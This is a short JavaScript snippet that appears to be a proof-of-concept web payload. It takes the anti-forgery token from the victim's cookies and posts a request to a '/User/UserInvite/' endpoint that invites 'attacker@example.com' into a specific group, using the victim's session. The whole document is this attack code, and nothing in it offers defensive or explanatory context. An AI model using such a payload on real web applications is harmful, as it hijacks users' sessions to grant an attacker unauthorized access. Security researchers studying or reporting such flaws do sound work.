fetch('/User/UserInvite/?groupId=79a433b5-7bfc-401a-834b-144889771d4d', { 
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Xsrf-Token': document.cookie.match(/Antiforgery[^;]+/)[0].split('=')[1]
    },
    body: JSON.stringify([{
      email: 'attacker@example.com'
    }])
  })
  .then(response => response.text())
  .then(result => console.log('Success:', result))
  .catch(error => console.error('Error:', error));
